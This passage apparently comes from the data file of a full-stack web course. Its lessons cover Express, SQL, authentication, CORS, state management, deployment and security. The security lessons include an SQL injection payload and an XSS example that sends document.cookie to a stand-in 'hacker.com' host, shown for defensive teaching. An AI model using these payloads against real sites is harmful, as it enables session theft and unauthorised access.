        code: 'const app = express();\napp.use(express.json());\n\n// Update a product:\napp.put("/api/products/:id", (req, res) => {\n  const productId = req.params.id;\n  const updatedDetails = req.body;\n  res.json({ id: productId, ...updatedDetails, updated: true });\n});\n\n// Delete a product:\napp.delete("/api/products/:id", (req, res) => {\n  res.json({ id: req.params.id, deleted: true });\n});',
      },
      {
        heading: 'Environment Variables: separating code from configuration',
        body: 'Your code runs in different environments: on your local laptop (development) and on a remote cloud server (production). These environments need different settings, such as different ports or database connections. Hardcoding these values in your code is bad practice. Instead, we use environment variables — configuration values stored in the operating system. In Node.js, you access them using process.env.VARIABLE_NAME.',
        code: '// Hardcoded (BAD):\n// const port = 3000;\n\n// Environment variable with fallback (GOOD):\nconst port = process.env.PORT || 3000;\napp.listen(port, () => console.log(`Running on port ${port}`));',
      },
      {
        heading: 'Dotenv and .gitignore: protecting secrets',
        body: 'To make local development easy, we store environment variables in a text file named .env. The dotenv package loads these values into process.env automatically when the app starts. CRITICAL RULE: Never commit your .env file to Git! It contains API keys, passwords, and secrets. If you push it to GitHub, hackers can steal your credentials. Always add .env to your .gitignore file and commit a template named .env.example instead.',
        code: '// Inside .env (never commit this!):\n// PORT=5000\n// DATABASE_URL=mongodb://localhost:27017/mydb\n// API_KEY=secret123\n\n// Inside server.js (at the very top):\nimport dotenv from "dotenv";\ndotenv.config(); // Loads .env into process.env\n\nconsole.log(process.env.API_KEY); // "secret123"',
        callout: 'A common practice is to create a .env.example file containing key names but blank values (like API_KEY=). This tells other developers what variables they need to configure without exposing actual secrets.',
      },
    ],
    aiPrompt: 'Design a RESTful API skeleton for a "tasks" resource. Write Express routes implementing GET /tasks, GET /tasks/:id, POST /tasks, PUT /tasks/:id, and DELETE /tasks/:id. Add dotenv config and load the port from process.env.PORT.',
    terminalMission: 'Create a .env file with PORT=4000. Create a .env.example file. Write a server file that loads the port via dotenv, listens on that port, and has a GET "/api/config" route returning the loaded port as JSON.',
  },

  'm4-databases-sql': {
    pathId: 'full-stack-web',
    title: 'Databases intro — relational vs document, SQL basics',
    duration: '13 min',
    mekLabel: 'enough to read SQL queries and choose the right DB for your project',
    sections: [
      {
        heading: 'Why Databases? Moving past in-memory arrays',
        body: 'If you store user data inside a JavaScript array like const users = [], that array lives in the computer\'s RAM (Random Access Memory). RAM is temporary. Every time you restart your Express server, update your code, or experience a server crash, that array is cleared, and all your data is lost forever. To store data permanently, we need a separate database system that writes data to disk (hard drive) and manages storage efficiently.',
        code: '// In-memory (RAM, temporary):\n// const todos = [{ id: 1, text: "Buy milk" }];\n\n// Persistent (Disk, Database):\n// Write todos to a structured file on the disk.',
      },
      {
        heading: 'Relational (SQL) vs Document (NoSQL) Databases',
        body: 'There are two primary categories of databases. Relational (SQL) databases organize data into structured tables, rows, and columns, with defined relationships between tables (examples: PostgreSQL, SQLite, MySQL). Document (NoSQL) databases store data in flexible, JSON-like objects called documents (example: MongoDB). Relational databases are preferred when data structure is strict and highly connected (like banking or e-commerce orders). NoSQL is preferred when data is unstructured or scales rapidly.',
        code: '// SQL Table representation (Relational):\n// Table: users\n// id | username | email\n// 1  | ada      | ada@example.com\n\n// NoSQL Document representation (Document):\n// { "id": 1, "username": "ada", "email": "ada@example.com" }',
      },
      {
        heading: 'SQL Basics: communicating with relational tables',
        body: 'Relational databases use SQL (Structured Query Language) to perform operations. An SQL database contains Tables. Each row in a table represents a record, and each column represents a property. Every table should have a Primary Key — a column containing a unique value (like an incrementing ID number) to identify each row.',
        code: '-- Create a table with defined columns and data types:\nCREATE TABLE users (\n  id SERIAL PRIMARY KEY, -- SERIAL automatically increments IDs (1, 2, 3...)\n  username VARCHAR(50) NOT NULL,\n  email VARCHAR(100) UNIQUE NOT NULL\n);',
      },
      {
        heading: 'Writing basic SQL Queries',
        body: 'You manipulate relational data using four primary SQL commands: SELECT (read data), INSERT (create data), UPDATE (modify data), and DELETE (remove data). You use a WHERE clause to filter which rows the action applies to — omitting the WHERE clause in an UPDATE or DELETE command will modify or wipe the entire table!',
        code: '-- 1. Select all users:\nSELECT * FROM users;\n\n-- 2. Insert a new user:\nINSERT INTO users (username, email) VALUES (\'grace\', \'grace@example.com\');\n\n-- 3. Update email for user with ID 1:\nUPDATE users SET email = \'new_ada@example.com\' WHERE id = 1;\n\n-- 4. Delete user with ID 2:\nDELETE FROM users WHERE id = 2;',
        callout: 'Always double-check your WHERE clauses! A query like DELETE FROM users; will delete every single user in your database, because no filter was specified.',
      },
    ],
    aiPrompt: 'I want to build a relational database for an online store. Write SQL statements to: 1. Create a "products" table (id, name, price, stock). 2. Insert 3 mock products. 3. Select products where stock is greater than 0. 4. Update the price of a product by its ID. Explain the datatypes used.',
    terminalMission: 'Write out the SQL queries to create a "comments" table (with columns for id, post_id, author, content, and created_at), insert a mock comment, and query all comments for a specific post_id.',
  },

  'm4-crud': {
    pathId: 'full-stack-web',
    title: 'CRUD operations connected to a real database',
    duration: '12 min',
    mekLabel: 'enough to build and verify the data layer of any web app',
    sections: [
      {
        heading: 'Database Drivers and Connection Pools',
        body: 'Your Express server runs in Node.js, and your database runs in a separate process. To make them talk, we install a database driver — a Node.js library specific to our database. For PostgreSQL, the driver is pg. To communicate efficiently, we set up a Connection Pool. Instead of opening a new connection for every request (which is slow), the pool keeps several connections open and shares them among incoming API requests.',
        code: 'import pg from "pg";\nconst { Pool } = pg;\n\n// Create a connection pool using credentials:\nconst pool = new Pool({\n  connectionString: process.env.DATABASE_URL\n});\n\n// Now we can run queries using pool.query',
      },
      {
        heading: 'Mapping REST methods to SQL CRUD operations',
        body: 'The CRUD paradigm (Create, Read, Update, Delete) maps directly to REST API routes and SQL statements. A POST route runs an INSERT query. A GET route runs a SELECT query. A PUT/PATCH route runs an UPDATE query. A DELETE route runs a DELETE query.',
        code: 'const app = express();\napp.use(express.json());\n\n// READ (GET) — Fetch all items from DB:\napp.get("/api/todos", async (req, res) => {\n  try {\n    const result = await pool.query("SELECT * FROM todos ORDER BY id ASC");\n    res.json(result.rows); // result.rows contains the array of records\n  } catch (err) {\n    res.status(500).json({ error: err.message });\n  }\n});',
      },
      {
        heading: 'Input Sanitization: preventing SQL Injection',
        body: 'Hackers exploit poorly written database queries using a technique called SQL Injection. If you construct your SQL queries by concatenating string variables directly (e.g. `SELECT * FROM users WHERE name = \'` + input + `\'`), a hacker can type SQL code into the input field to bypass logins or delete your tables. To prevent this, we must use parameterized queries (using placeholders like $1, $2) and let the database driver safely sanitize the values.',
        code: '// ⚠️  VULNERABLE to SQL Injection (Never do this!):\n// pool.query(`SELECT * FROM users WHERE email = \'${email}\'`);\n\n// SAFE — Parameterized query:\napp.get("/api/users", async (req, res) => {\n  const email = req.query.email;\n  const queryText = "SELECT * FROM users WHERE email = $1";\n  const values = [email]; // Driver safely escapes values\n\n  const result = await pool.query(queryText, values);\n  res.json(result.rows[0]);\n});',
        callout: 'Input sanitization is not optional. Every time you accept data from a user (in req.body, req.query, or req.params) and send it to a database, you must use parameterized queries.',
      },
    ],
    aiPrompt: 'Write a complete Express route for POST "/api/products" that inserts a new product (name, price) into a database. Use a parameterized query, handle database errors using try/catch, and return the inserted product with status 201.',
    terminalMission: 'Write an Express GET route "/api/users/:id" that fetches a user from a database by ID. Use a parameterized query ($1 placeholder) and return a 404 error if the user is not found.',
  },

  'm4-auth-basics': {
    pathId: 'full-stack-web',
    title: 'Authentication basics — sessions, tokens, hashing',
    duration: '10 min',
    mekLabel: 'enough to understand what "login" means under the hood',
    sections: [
      {
        heading: 'Authentication vs Authorization',
        body: 'Security on the web involves two steps: authentication and authorization. Authentication (AuthN) is verifying who a user is — usually via email and password (confirming identity). Authorization (AuthZ) is deciding what a user is allowed to do after logging in — for example, checking if a user has admin privileges to delete a product (confirming permissions).',
        code: '// Authentication: "I am Ada, here is my password."\n// Authorization: "Is Ada an admin? Yes, let her delete this post."',
      },
      {
        heading: 'Password Hashing: never store plain-text credentials',
        body: 'CRITICAL RULE: Never store passwords in plain text in your database! If a hacker steals your database, they will have everyone\'s password. Instead, we use password hashing. Hashing is a one-way mathematical function that converts a password into a secure scramble (hash). It is impossible to turn a hash back into the password. When a user logs in, we hash their input and compare it to the stored hash. We use libraries like bcrypt to hash and verify passwords safely.',
        code: 'import bcrypt from "bcrypt";\n\n// 1. During registration — hash the password:\nconst password = "mySecurePassword123";\nconst saltRounds = 10; // Extra random data for security\nconst hashedPassword = await bcrypt.hash(password, saltRounds);\n// Store hashedPassword in database instead of password!\n\n// 2. During login — compare input with stored hash:\nconst inputPassword = "mySecurePassword123";\nconst isMatch = await bcrypt.compare(inputPassword, hashedPassword);\nconsole.log(isMatch); // true',
      },
      {
        heading: 'Tokens (JWT) vs Sessions: how servers remember you',
        body: 'HTTP is stateless, meaning the server forgets who you are between requests. To remember logged-in users, we use Sessions or Tokens. In session-based auth, the server stores a session in memory/DB and sets a Session ID cookie in the browser. In token-based auth, the server issues a JSON Web Token (JWT) — a signed JSON string containing user details. The browser stores this token (in localStorage or cookies) and sends it in the Authorization header on future API calls. The server verifies the signature to validate the user.',
        code: 'import jwt from "jsonwebtoken";\n\n// 1. Generate a JWT token on successful login:\nconst userPayload = { userId: 12, role: "student" };\nconst secretKey = process.env.JWT_SECRET;\nconst token = jwt.sign(userPayload, secretKey, { expiresIn: "2h" });\n\n// 2. Verify a JWT token on incoming requests:\ntry {\n  const decoded = jwt.verify(token, secretKey);\n  console.log("Authenticated user:", decoded.userId);\n} catch (err) {\n  console.log("Invalid token!");\n}',
        callout: 'JWT tokens are signed, not encrypted. This means anyone can decode the token to read the payload info. Never put sensitive secrets (like passwords or credit card numbers) inside a JWT token payload!',
      },
    ],
    aiPrompt: 'Write an Express POST "/api/login" route handler. It should accept email and password in the body, fetch the user from a database, verify the password using bcrypt.compare(), and if valid, generate and return a signed JWT token. Handle wrong credentials with a 401 error.',
    terminalMission: 'Create a Node script that uses bcrypt to hash a password, then compares a correct and an incorrect password against the resulting hash. Log the match results.',
  },

  'm5-api-from-react': {
    pathId: 'full-stack-web',
    title: 'Calling your own API from React — fetch, loading state',
    duration: '10 min',
    mekLabel: 'enough to call your own API from React and handle loading state',
    sections: [
      {
        heading: 'Bridging the divide: connecting frontend to backend',
        body: 'So far, we have built a React frontend running in the browser and an Express backend server running in Node.js. Currently, they are separate. To build a complete web application, our React components must make HTTP requests (using the Fetch API) to our Express server to load real data, submit forms, or update information stored in our database. This is the foundation of full-stack development.',
        code: '// Frontend: React component makes a fetch call\n// GET http://localhost:3000/api/todos\n\n// Backend: Express route handles the request and query DB\n// app.get("/api/todos", (req, res) => res.json(todos));',
      },
      {
        heading: 'Handling network states in React',
        body: 'When you fetch data from your own server, the request is asynchronous and takes time. During this time, the component should show a loading indicator. If the server is offline or returns an error, the frontend should display a user-friendly error message. We manage these transitions by holding state for loading (boolean) and error (string or null).',
        code: 'import { useEffect, useState } from "react";\n\nconst TodoList = () => {\n  const [todos, setTodos] = useState([]);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    fetch("http://localhost:3000/api/todos")\n      .then(res => {\n        if (!res.ok) throw new Error("Failed to fetch todos");\n        return res.json();\n      })\n      .then(data => {\n        setTodos(data);\n        setLoading(false);\n      })\n      .catch(err => {\n        setError(err.message);\n        setLoading(false);\n      });\n  }, []);\n\n  if (loading) return <p>Loading todos from server...</p>;\n  if (error)   return <p>Error: {error}</p>;\n  return <ul>{todos.map(t => <li key={t.id}>{t.text}</li>)}</ul>;\n};',
      },
      {
        heading: 'Sending data back: POST requests from React',
        body: 'To add new data (like registering a user or creating a task), we use a fetch call with the POST method. We set the method, add the headers for "Content-Type: application/json", and stringify the input state. Once the server responds successfully, we update the local frontend state so the screen reflects the new data immediately without reloading the page.',
        code: 'const AddTodo = ({ onAdd }) => {\n  const [text, setText] = useState("");\n\n  const handleSubmit = async (e) => {\n    e.preventDefault();\n    const response = await fetch("http://localhost:3000/api/todos", {\n      method: "POST",\n      headers: { "Content-Type": "application/json" },\n      body: JSON.stringify({ text })\n    });\n    const newTodo = await response.json();\n    onAdd(newTodo); // Add to parent component list state\n    setText("");\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <input value={text} onChange={e => setText(e.target.value)} />\n      <button type="submit">Add Todo</button>\n    </form>\n  );\n};',
        callout: 'Relative vs Absolute URLs: during local development, your React app runs on http://localhost:5173 and your API runs on http://localhost:3000. You must use absolute URLs in your fetch calls. When deployed together, you can use relative paths like "/api/todos".',
      },
    ],
    aiPrompt: 'Create a React Guestbook component that fetches list of messages from a backend API on load, displays them, and has a form where users can submit their name and a message. Write code handling fetch, POST, loading, and error states.',
    terminalMission: 'Write a React component that fetches data from http://localhost:3000/api/profile. If the API returns a 401 Unauthorized status, display a redirect message, otherwise display the username and profile picture.',
  },

  'm5-cors': {
    pathId: 'full-stack-web',
    title: 'CORS — what it is and why it exists',
    duration: '6 min',
    mekLabel: 'enough to configure CORS middleware on Express and resolve port conflicts',
    sections: [
      {
        heading: 'The CORS Error: why the browser blocked your request',
        body: 'When you first fetch data from a React frontend on port 5173 to an Express server on port 3000, the request will fail. Inspecting the browser console shows a red error: "Blocked by CORS policy: No Access-Control-Allow-Origin header is present." CORS stands for Cross-Origin Resource Sharing. This is not a bug in your code, but a browser security feature built to protect users from malicious attacks.',
        code: '// Origin: Protocol (http) + Domain (localhost) + Port (5173)\n// React origin: http://localhost:5173\n// Express origin: http://localhost:3000\n// Since ports differ, they are considered DIFFERENT origins.',
      },
      {
        heading: 'The Same-Origin Policy (SOP)',
        body: 'Browsers enforce the Same-Origin Policy (SOP) by default. It prevents a script on a website from reading data on another website. For example, if you are logged into your bank account on bank.com, and you visit a malicious website coolgames.com, SOP prevents coolgames.com from making fetch requests to bank.com to steal your transaction history. However, in modern web development, we construct our frontends and backends as separate apps on different origins. We need a secure way to allow access.',
        code: '// Same-Origin Policy: Blocks coolgames.com from fetching data from bank.com\n// CORS: Configures bank.com to allow requests from verified-partner.com',
      },
      {
        heading: 'CORS Headers: letting the browser know it is safe',
        body: 'CORS is a handshake protocol. When React makes a cross-origin request, the browser automatically sends an HTTP header called Origin. The backend server inspects this header. If it is allowed, the server responds with a header called Access-Control-Allow-Origin: http://localhost:5173. The browser sees this header and allows the frontend script to read the data. If this header is missing or mismatching, the browser throws the CORS error and blocks the data.',
        code: '// Request Headers:\n// Origin: http://localhost:5173\n\n// Response Headers (Allowed):\n// Access-Control-Allow-Origin: http://localhost:5173\n// Access-Control-Allow-Methods: GET, POST, PUT, DELETE',
      },
      {
        heading: 'Configuring CORS in Express',
        body: 'In Node/Express, we don\'t write CORS headers manually. Instead, we install and use the cors middleware package. You can configure it to allow any origin (using wildcard "*", which is common for public APIs) or restrict it strictly to your verified frontend origin for security.',
        code: '// Install via terminal:\n// $ npm install cors\n\nimport express from "express";\nimport cors from "cors";\nconst app = express();\n\n// 1. Allow ALL origins (easy, but less secure):\n// app.use(cors());\n\n// 2. Allow only your React frontend (recommended):\napp.use(cors({\n  origin: "http://localhost:5173",\n  methods: ["GET", "POST", "PUT", "DELETE"],\n  credentials: true // Allow cookies/auth headers\n}));\n\napp.get("/api/data", (req, res) => res.json({ msg: "Safe!" }));',
        callout: 'CORS is strictly enforced by web browsers. Postman, curl, or mobile apps bypass CORS checks entirely because they are not browsers. If a request works in Postman but fails in React, it is almost certainly a CORS configuration issue.',
      },
    ],
    aiPrompt: 'Write Express backend server code that imports and configures the cors package. Enable CORS to allow requests only from two specific origins (e.g. local dev "http://localhost:5173" and production frontend "https://myapp.vercel.app").',
    terminalMission: 'Install the cors package. Create an Express file with cors middleware configured to allow requests from http://localhost:5173. Verify the server runs without errors.',
  },

  'm5-state-management': {
    pathId: 'full-stack-web',
    title: 'State management patterns as your app grows',
    duration: '8 min',
    mekLabel: 'enough to manage shared application state using global stores like Zustand',
    sections: [
      {
        heading: 'The Prop Drilling problem',
        body: 'In simple React apps, state is stored inside components and passed down via props. But as apps grow, multiple distant components need access to the same state (like user auth status, shopping cart count, or active theme). Passing props down through 5 layers of child components that don\'t actually use the data just to reach a deep child is called prop drilling. This makes code hard to read, maintain, and modify.',
        code: '// App (holds user state)\n// └── NavigationBar (needs user state but pass it down)\n//     └── UserMenu (needs user state but pass it down)\n//         └── AvatarButton (actually uses user state)\n// Prop drilling: user prop is dragged through components unnecessarily.',
      },
      {
        heading: 'React Context API: built-in global state',
        body: 'React provides a built-in solution to prop drilling called the Context API. Context acts like a portal: you define data at the top level (a Provider), and any child component anywhere in the tree can "tune in" and read that data directly (using the useContext hook) without passing it through intermediate props.',
        code: 'import { createContext, useContext, useState } from "react";\n\n// Create the context:\nconst UserContext = createContext();\n\n// Wrap parent component in Provider:\nconst App = () => {\n  const [user, setUser] = useState({ name: "Shedrach" });\n  return (\n    <UserContext.Provider value={user}>\n      <NavigationBar />\n    </UserContext.Provider>\n  );\n};\n\n// Deep child reads value directly:\nconst AvatarButton = () => {\n  const user = useContext(UserContext);\n  return <button>{user.name[0]}</button>;\n};',
      },
      {
        heading: 'Global Store Libraries: introducing Zustand',
        body: 'For larger apps, using too many React Contexts can cause performance issues (unnecessary re-renders) and complex boilerplate code. Developers use state management libraries. Zustand is currently the most popular, lightweight library. It lets you create a centralized "store" containing state variables and functions (actions) to update them. Any component can import and read/write to the store directly.',
        code: '// Install Zustand:\n// $ npm install zustand\n\nimport { create } from "zustand";\n\n// Define a global store:\nconst useCartStore = create((set) => ({\n  items: [],\n  addToCart: (item) => set((state) => ({ items: [...state.items, item] })),\n  clearCart: () => set({ items: [] })\n}));\n\n// Use inside any React component:\nconst CartDisplay = () => {\n  const items = useCartStore((state) => state.items);\n  const addToCart = useCartStore((state) => state.addToCart);\n  return <button onClick={() => addToCart("Book")}>Add Book ({items.length})</button>;\n};',
        callout: 'State management libraries like Zustand are highly compatible with AI coding tools. By separating application state logic from UI rendering files, AI assistants can write cleaner, modular components without breaking your global state logic.',
      },
    ],
    aiPrompt: 'Create a global auth store in React using Zustand. It should store user details (null if logged out) and a loading state. Provide actions for login (takes user details and sets state) and logout (clears state). Show how a component uses it.',
    terminalMission: 'Create a Zustand store that manages a list of tasks. Include actions to add a task, toggle a task\'s completion, and remove a task. Write a component displaying tasks and counting completed items.',
  },

  'm5-deploy-debug': {
    pathId: 'full-stack-web',
    title: 'Deployment & debugging across the full stack',
    duration: '12 min',
    mekLabel: 'enough to build, deploy, and debug a full-stack application on the cloud',
    sections: [
      {
        heading: 'Building for production: packaging your frontend',
        body: 'During local development, your React app runs on a development server that updates live. But this server is slow and contains extra debug tools. For production, we build the app. The build tool (like Vite) compiles all our JSX, CSS, and JS files, optimizes them, and outputs a folder containing static assets (HTML, CSS, JS) that are extremely fast to serve.',
        code: '// Run production build:\n// $ npm run build\n\n// Generates a `/dist` folder containing index.html and optimized JS/CSS files.',
      },
      {
        heading: 'Full-Stack Hosting: static vs dynamic servers',
        body: 'Frontends are static files and can be hosted on Content Delivery Networks (CDNs) for high speed (examples: Vercel, Netlify). Backends run active code (Express server, database connection) and require cloud hosting instances (examples: Render, Railway, Fly.io). Relational databases are hosted on serverless database clouds (examples: Neon, Supabase).',
        code: '// Frontend -> Host on Vercel (static files served globally)\n// Backend API -> Host on Render (dynamic server running 24/7)\n// Database -> Host on Neon/Supabase (cloud SQL instance)',
      },
      {
        heading: 'Production environment configurations',
        body: 'When hosting your app in the cloud, you must update your environment settings. You will go to your host dashboards (Vercel and Render) and enter production environment variables. For example, your database connection string must point to your live Neon database URL, and your frontend must point to the backend production URL.',
        code: '// Local dev environment (.env):\n// DATABASE_URL=postgres://localhost:5432/mydb\n// API_URL=http://localhost:3000\n\n// Production environment (Host Dashboard settings):\n// DATABASE_URL=postgres://neon.tech/prod_db\n// API_URL=https://api.my-server.com',
      },
      {
        heading: 'Full-Stack Debugging: identifying issues',
        body: 'When your deployed application fails, you must debug across the stack. 1. Client Console: check for red errors in browser developer tools. 2. Network Tab: check if fetch calls are failing (e.g. 500 Server Error or 404 Not Found). 3. Server Logs: go to your Render/Railway dashboard and read the live stdout console output. The server logs will contain the exact Node.js stack trace (error message and line number) explaining why the backend crashed.',
        code: '// 1. Check browser console for errors: red warnings\n// 2. Check Network Tab: check status codes (500, 403, 404)\n// 3. Check Server Logs dashboard for: "TypeError: Cannot read property \'rows\' of undefined"',
        callout: 'Never leave console.log or database credentials printed in production server logs. Security audits scan log outputs for leaks.',
      },
    ],
    aiPrompt: 'Write a step-by-step troubleshooting guide for a full-stack developer whose React app works locally but shows a blank screen and infinite spinner after deploying to production. Explain how to use DevTools and server dashboards.',
    terminalMission: 'Create a checklist of deployment tasks for a full-stack React + Express + PostgreSQL app. Include steps for building, configuring CORS, environment variables, database schema migration, and verification.',
  },

  'm6-security-mindset': {
    pathId: 'full-stack-web',
    title: 'The security mindset — "works" vs "can be abused"',
    duration: '8 min',
    mekLabel: 'enough to think defensively and understand trust boundaries',
    sections: [
      {
        heading: 'The Security Mindset: from functional to defensive coding',
        body: 'When learning to code, your focus is on making things work: "When I click this button, does the page load?" But when you deploy your application to the cloud, it is exposed to the entire internet. Anyone — including automated bots and malicious hackers — can visit your site. To build secure apps, we must shift our thinking. The security mindset is about looking at every feature and asking: "It works, but how can this be abused? What inputs could break it? What happens if someone bypasses the UI entirely?"',
        code: '// Functional mindset: "User enters username -> we save to DB."\n// Security mindset: "What if user enters 50,000 characters? What if they enter SQL database commands? What if they bypass the browser form entirely?"',
      },
      {
        heading: 'Trust Boundaries: client vs server side controls',
        body: 'A fundamental rule of cybersecurity is: never trust the client. The client is the browser. In full-stack web apps, you have zero control over the client. Anyone can open browser developer tools, edit the JavaScript code, disable HTML form restrictions, or write scripts to send requests directly to your backend. The server, however, is inside your trust boundary — you control it completely. Because of this, client-side validation (like HTML "required" attributes) is strictly for User Experience (UX), while server-side validation is mandatory for actual security.',
        code: '// Frontend validation (UX only — easily bypassed):\n// <input type="number" max="100" />\n\n// Backend validation (Mandatory for security):\napp.post("/api/payment", (req, res) => {\n  const amount = Number(req.body.amount);\n  if (amount > 100) {\n    return res.status(400).json({ error: "Invalid payment amount" });\n  }\n  // Proceed safely...\n});',
      },
      {
        heading: 'The Principle of Least Privilege',
        body: 'The Principle of Least Privilege states that any module, system, or user should only have the bare minimum levels of access necessary to complete its function. For example, your Express server only needs to read and write records to your database. It does not need permission to delete tables, create new databases, or modify the database server settings. By restricting your backend database user credentials, you minimize the damage if your backend is compromised.',
        code: '// Bad Practice: connect server to database using "postgres" root superuser credentials.\n// Good Practice: connect server using a restricted database user "app_client" who only has SELECT, INSERT, and UPDATE permissions on specific tables.',
        callout: 'Security is not about building one perfect wall. It is about "defense in depth" — layering multiple independent security controls (like client checks, server checks, restricted database privileges) so that if one layer fails, others still protect your system.',
      },
    ],
    aiPrompt: 'Write an Express backend router that validates incoming request bodies. Show a route for POST "/api/register" that checks that: email is valid, password is at least 8 characters, and age is a number between 13 and 120. Return specific 400 Bad Request messages for validation failures.',
    terminalMission: 'Write a short design analysis for a file upload feature. Explain three ways an attacker could abuse this feature (e.g. uploading huge files, uploading script files) and how to mitigate them.',
  },

  'm6-sql-injection': {
    pathId: 'full-stack-web',
    title: 'SQL injection & XSS — how parameterized queries help',
    duration: '11 min',
    mekLabel: 'enough to protect your database against SQLi and your pages against XSS injection',
    sections: [
      {
        heading: 'SQL Injection: when data behaves as code',
        body: 'SQL Injection (SQLi) is one of the most common and dangerous database vulnerabilities. It occurs when a web server takes unsanitized user input (like a text input) and concatenates it directly into an SQL query string. If the user inputs SQL commands (like OR 1=1 or DROP TABLE), the database engine interprets their input as database instructions, allowing the attacker to bypass authentication, steal data, or wipe database tables.',
        code: '// ⚠️ VULNERABLE SQL (String Concatenation):\n// const query = "SELECT * FROM users WHERE username = \'" + userInput + "\'";\n\n// If userInput is: admin\' OR \'1\'=\'1\n// The query becomes: SELECT * FROM users WHERE username = \'admin\' OR \'1\'=\'1\'\n// Result: Database returns all users, logging the attacker in as admin!',
      },
      {
        heading: 'Parameterized Queries: separating code from data',
        body: 'The absolute fix for SQL Injection is using Parameterized Queries (also called Prepared Statements). Instead of combining code and user input into a single string, we write our query using placeholders (like $1, $2) and pass the inputs separately. The database engine compiles the SQL query template first, then inserts the user values. This guarantees that user input is treated strictly as data, never as executable code.',
        code: 'const username = req.body.username;\nconst password = req.body.password;\n\n// SAFE — Separating query syntax from values:\nconst queryText = "SELECT * FROM users WHERE username = $1 AND password = $2";\nconst queryValues = [username, password];\n\nconst result = await pool.query(queryText, queryValues);',
      },
      {
        heading: 'Cross-Site Scripting (XSS): injecting browser code',
        body: 'While SQL Injection targets your database, Cross-Site Scripting (XSS) targets your website\'s users. XSS occurs when your server accepts user input (like a message board comment) containing HTML or JavaScript (like <script>alert("hacked")</script>) and saves it to the database. When other users visit your site and view that comment, their browsers execute the malicious script. The attacker\'s script can steal the user\'s cookies, capture credentials, or hijack their session.',
        code: '// Malicious user inputs a comment:\n// "Great article! <script>fetch(\'http://hacker.com/steal?cookie=\' + document.cookie)</script>"\n\n// If the server renders this comment directly, the browser executes the script.',
      },
      {
        heading: 'React\'s default safety and XSS protection',
        body: 'By default, React protects you from XSS. When you render strings inside JSX curly braces (e.g. <p>{commentText}</p>), React automatically sanitizes and escapes the string before drawing it, treating it strictly as text rather than executable HTML/JS. However, React provides an escape hatch called dangerouslySetInnerHTML to render raw HTML. Using this attribute bypasses safety checks and should be avoided or restricted only to thoroughly sanitized inputs (using libraries like DOMPurify).',
        code: '// SAFE (React automatically escapes HTML strings):\nconst Comment = ({ text }) => {\n  return <p>{text}</p>;\n};\n\n// ⚠️ VULNERABLE (Avoid this unless sanitized):\nconst DangerousComment = ({ htmlText }) => {\n  return <div dangerouslySetInnerHTML={{ __html: htmlText }} />;\n};',
        callout: 'XSS occurs because the browser cannot distinguish between a script written by your website developers and a script injected by a malicious user. Proper content escaping and setting a Content Security Policy (CSP) header help the browser enforce what scripts are allowed to run.',
      },
    ],
    aiPrompt: 'Write a secure Node/Express route handler using a database driver (like pg) that accepts search parameters, filters results safely using parameterized queries, and escapes HTML characters to prevent XSS before sending responses back to the React client.',
    terminalMission: 'Create a simple React file showing how rendering userInput inside JSX prevents XSS. Show an example of how using dangerouslySetInnerHTML can make the component vulnerable, and write code to protect it using DOMPurify.',
  },

  'm6-secrets-auth': {
    pathId: 'full-stack-web',
    title: 'Secrets management, password hashing & auth pitfalls',
    duration: '11 min',
    mekLabel: 'enough to manage app credentials securely and implement strong password validation',
    sections: [
      {
        heading: 'Secrets Management: keeping keys off GitHub',
        body: 'When building full-stack apps, you will use secrets: database passwords, API keys (like Stripe or OpenAI), and JWT signing keys. A major security blunder is hardcoding these secrets in your code files. Once you push your project to a public repository on GitHub, bots automatically scan the files, steal your keys, and can run up thousands of dollars of charges. Always store secrets in environment variables (.env) and never commit .env to Git.',
        code: '// ⚠️ CRITICAL VULNERABILITY (Hardcoded Key):\n// const apiKey = "sk_live_51NvXYZabc123";\n\n// SECURE (Loaded from environment):\nconst apiKey = process.env.STRIPE_API_KEY;\nif (!apiKey) throw new Error("API Key is missing!");',
      },
      {
        heading: 'Salting and Pepper: advanced password storage',
        body: 'We learned in Module 4 that we hash passwords usingbcrypt to protect them. Let\'s explore why salting is essential. A salt is a unique, random string appended to a password before hashing. Without salts, two users with the password "123456" would have the exact same hash in the database, allowing hackers to look up hashes in pre-computed databases (Rainbow Tables). Salting ensures every user hash is unique. A pepper is a secret key stored on the server config (outside the database) appended to all passwords before hashing, providing an extra layer of defense.',
        code: '// Hashing process with Salt:\n// Password ("12345") + Salt ("xyzRandomString") -> Hashed output\n\n// Even if two users have the same password "12345",\n// their hashes will look completely different due to different salts.',
      },
      {
        heading: 'Rate Limiting: stopping brute-force attacks',
        body: 'Even with secure password hashing, hackers can attempt to guess user credentials by sending thousands of login requests per second using automated scripts. This is a brute-force attack. To protect your server, you should implement Rate Limiting. This is middleware that tracks request counts per IP address and blocks further attempts if a limit is exceeded within a time window.',
        code: 'import express from "express";\nimport rateLimit from "express-rate-limit";\nconst app = express();\n\n// Create a rate limiter for login route:\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 5, // Limit each IP to 5 requests per window\n  message: "Too many login attempts, please try again after 15 minutes."\n});\n\n// Apply to login endpoint:\napp.post("/api/login", loginLimiter, (req, res) => {\n  // Handle secure login...\n});',
      },
      {
        heading: 'Authentication Pitfalls: short-lived tokens',
        body: 'When using JSON Web Tokens (JWT) for authentication, remember that once a token is issued, it cannot easily be revoked. If a token is stolen, the hacker has access until the token expires. For this reason, access tokens must have a very short lifespan (e.g. 15 minutes), and we use secure HTTP-only cookies to store refresh tokens which can be revoked on the server.',
        code: '// Bad Practice: jwt.sign(payload, secret, { expiresIn: "1 year" });\n// Good Practice: jwt.sign(payload, secret, { expiresIn: "15m" });',
        callout: 'Rate limiters not only protect your authentication endpoints from brute-force guessing; they also protect your server from Denial of Service (DoS) attacks where excessive traffic crashes your API.',
      },
    ],
    aiPrompt: 'Write an Express registration route that enforces strong password rules (minimum 8 characters, must contain at least one uppercase letter, one lowercase letter, one number, and one special character) and hashes the password using bcrypt.',
    terminalMission: 'Configure an Express server file using the express-rate-limit library. Create a rate limiter that allows 100 API requests per hour generally, but restricts POST /api/payment to 3 requests per minute. Verify syntax.',
  },

  'm6-https-vuln-scan': {
    pathId: 'full-stack-web',
    title: 'HTTPS, CSRF & spot-the-vulnerability exercise',
    duration: '10 min',
    mekLabel: 'enough to identify common full-stack security flaws and explain transport encryption',
    sections: [
      {
        heading: 'HTTPS: transport layer security',
